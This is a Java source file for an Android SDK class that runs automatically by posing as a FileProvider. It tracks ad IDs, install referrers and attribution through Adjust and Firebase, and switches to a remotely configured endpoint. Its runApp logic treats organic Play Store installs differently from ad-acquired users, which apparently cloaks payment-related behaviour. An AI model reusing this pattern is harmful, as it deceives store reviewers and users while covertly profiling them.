package com.ma.fbsdk;

import static com.ma.fbsdk.utils.Utils.getElapsedTimeInSeconds;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Application;
import android.content.Intent;
import android.os.Bundle;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.FileProvider;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustConfig;
import com.adjust.sdk.AdjustEvent;
import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.google.firebase.FirebaseApp;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.gson.Gson;
import com.ma.fbsdk.models.Params;
import com.ma.fbsdk.models.Payments;
import com.ma.fbsdk.observer.DynButton;
import com.ma.fbsdk.observer.DynURL;
import com.ma.fbsdk.observer.Events;
import com.ma.fbsdk.observer.URLObservable;
import com.ma.fbsdk.ui.AppFileActivity;
import com.ma.fbsdk.ui.PrelanderActivity;
import com.ma.fbsdk.utils.Constants;
import com.ma.fbsdk.utils.FirebaseConfig;
import com.ma.fbsdk.utils.Utils;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

public class Bandora extends FileProvider implements Application.ActivityLifecycleCallbacks {
    public static final String TAG = "BANDORA";
    public int activitiesCounter = 0;
    public boolean isLaunched = false;
    public boolean remoteConfigIsLaunched = false;
    public Params webParams = new Params();
    public Long timestamp;
    static URLObservable ov;
    InstallReferrerClient referrerClient;
    Activity finalActivity;

    @SuppressLint("StaticFieldLeak")
    public static View upgrade_premium_layout;
    @SuppressLint("StaticFieldLeak")
    public static View upgrade_premium;
    public static boolean show_update_button = false;

    FirebaseConfig fc ;

    @Override
    public boolean onCreate() {

        timestamp = System.nanoTime();

        FirebaseApp.initializeApp(getContext());

        initAdjust();
        getGoogleInstallReferrer();

        Application app = (Application) Utils.makeContextSafe(getContext());
        app.registerActivityLifecycleCallbacks(this);

        ov = new URLObservable();
        EventBus.getDefault().register(this);

        return super.onCreate();
    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    public void onMessageEvent(DynURL o) {

        runApp();

    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    public void onMessageEvent(DynButton o) {

        upgrade_premium_layout.setVisibility(show_update_button ? View.VISIBLE : View.GONE);

        upgrade_premium.setOnClickListener(view -> {
            EventBus.getDefault().post(new DynURL());
        });
    }

    public static void addUpgradeToPremium(View upgrade_premium_l, Button upgrade_b) {
        upgrade_premium_layout = upgrade_premium_l;
        upgrade_premium = upgrade_b;

        ov.api_should_start(Events.UPGRADE_BUTTON_LOADED);

    }

    @Override
    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {
        finalActivity = activity;

        if(!remoteConfigIsLaunched){
            remoteConfigIsLaunched = true;
            getRemoteConfig();
        }

        if (activitiesCounter == 1 && !isLaunched) {
            ov.api_should_start(Events.MAIN_ACTIVITY_LAUNCHED);
        }
        activitiesCounter++;
    }

    private void getRemoteConfig(){
        fc = FirebaseConfig.getInstance();
        fc.fetchVaues(finalActivity, () -> {

            try {
                callURL();
                initAdjustAdditionalCallback();
                Gson gson = new Gson();
                fc.payments = gson.fromJson(fc.payment_options, Payments[].class);
                show_update_button = fc.show_update_button;

                ov.api_should_start(Events.FIREBASE_REMOTE_CONFIG);

            } catch (Exception e) {
                Utils.logEvent(getContext(), Constants.firbase_remote_config_fetch_error, "");
                e.printStackTrace();
            }
        });

    }

    private void initAdjust() {
        String appToken = getContext().getString(R.string.adjust_token);
        String environment = AdjustConfig.ENVIRONMENT_PRODUCTION;
        AdjustConfig config = new AdjustConfig(getContext(), appToken, environment);

        config.setOnAttributionChangedListener(attribution -> {

            Utils.logEvent(getContext(), Constants.adjust_attr_received_in_  , "" + getElapsedTimeInSeconds(timestamp));

            if (attribution != null) {
                webParams.setAdjustAttribution(attribution.toString());
            }
        });

        config.setOnDeeplinkResponseListener(deeplink -> {

            webParams.setDeeplink(deeplink.toString());
            return false;
        });

        Adjust.getGoogleAdId(getContext(), googleAdId -> webParams.setGoogleAdId(googleAdId));
        Adjust.onCreate(config);

        Adjust.addSessionCallbackParameter("user_uuid", Utils.generateClickId(getContext()));
        String versionCode = BuildConfig.VERSION;
        Adjust.addSessionCallbackParameter("m_sdk_version", versionCode);
        Utils.logEvent(getContext(), Constants.m_sdk_version + versionCode, "");

    }

    private void initAdjustAdditionalCallback() {
        try {
            FirebaseAnalytics.getInstance(getContext()).getAppInstanceId().addOnCompleteListener(task -> {
                webParams.setFirebaseInstanceId(task.getResult());
                AdjustEvent adjustEvent = new AdjustEvent(fc.f_event_token);
                adjustEvent.addCallbackParameter("eventValue", task.getResult());
                adjustEvent.addCallbackParameter("user_uuid", Utils.generateClickId(getContext()));
                Adjust.trackEvent(adjustEvent);
                Utils.logEvent(getContext(), Constants.firbase_instanceid_sent, "");
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void getGoogleInstallReferrer() {
        referrerClient = InstallReferrerClient.newBuilder(getContext()).build();
        referrerClient.startConnection(new InstallReferrerStateListener() {
            @Override
            public void onInstallReferrerSetupFinished(int responseCode) {
                switch (responseCode) {
                    case InstallReferrerClient.InstallReferrerResponse.OK:
                        try {
                            generateInstallReferrer();
                        } catch (RemoteException e) {
                            e.printStackTrace();
                            Utils.logEvent(getContext(), Constants.google_ref_attr_remote_except, "");
                        }
                        break;
                    case InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED:
                        // API not available on the current Play Store app.
                        Utils.logEvent(getContext(), Constants.google_ref_attr_error_feature_not_supported, "");
                        break;
                    case InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE:
                        // Connection couldn't be established.
                        Utils.logEvent(getContext(), Constants.google_ref_attr_error_service_unavailable, "");
                        break;
                }

                ov.api_should_start(Events.GOOGLE_REFERRER);
            }

            @Override
            public void onInstallReferrerServiceDisconnected() {
                // Try to restart the connection on the next request to
                // Google Play by calling the startConnection() method.
                Utils.logEvent(getContext(), Constants.google_ref_attr_error_service_disconnected, "");
            }
        });
    }

    public void generateInstallReferrer() throws RemoteException {
        try {
            Utils.logEvent(getContext(), Constants.google_ref_attr_received_in_ + getElapsedTimeInSeconds(timestamp), "");
            ReferrerDetails response = this.referrerClient.getInstallReferrer();
            webParams.setGoogleAttribution(response.getInstallReferrer());

        } catch (Exception e) {
            e.printStackTrace();
            Utils.logEvent(getContext(), Constants.google_ref_attr_received_exception, "");
        }
    }

    public void callURL() {

        String endURL = fc.finalEndp;

        if (endURL != null && !endURL.equals("")) {
            Constants.showAds = false;
            if (endURL.startsWith("http")) {
                Constants.setEndP(getContext(), endURL);
            } else {
                Constants.setEndP(getContext(), "https://" + endURL);
            }
        }
    }

    public void runApp() {

        String attribution = webParams.getGoogleAttribution();

        if (!BuildConfig.DEBUG) {
            if (attribution == null || attribution.isEmpty() || attribution.toLowerCase().contains("organic") || attribution.toLowerCase().contains("play-store")) {
                Utils.logEvent(getContext(), Constants.sdk_stopped_organic, "");
                Utils.logEvent(getContext(), Constants.open_native_app_organic , "");

                Intent pintent = new Intent(getContext(), PrelanderActivity.class);
                pintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                pintent.putExtra("webParams", webParams);
                getContext().startActivity(pintent);

                return;
            }
        }else{

            if(fc.bypass_payment_options){
                Intent intent = new Intent(getContext(), AppFileActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("webParams", webParams);
                getContext().startActivity(intent);

            }else{
                Intent intent = new Intent(getContext(), PrelanderActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("webParams", webParams);
                getContext().startActivity(intent);
            }
        }
    }

    public void AppMainActivity() {
        //  getContext().startActivity(new Intent(getContext(), AppFileActivity.class));
        return;
    }

    @Override
    public void onActivityStarted(@NonNull Activity activity) {
    }

    @Override
    public void onActivityResumed(@NonNull Activity activity) {
        Adjust.onResume();
    }

    @Override
    public void onActivityPaused(@NonNull Activity activity) {
        Adjust.onPause();
    }

    @Override
    public void onActivityStopped(@NonNull Activity activity) {
    }

    @Override
    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {
    }

    @Override
    public void onActivityDestroyed(@NonNull Activity activity) {
    }
}
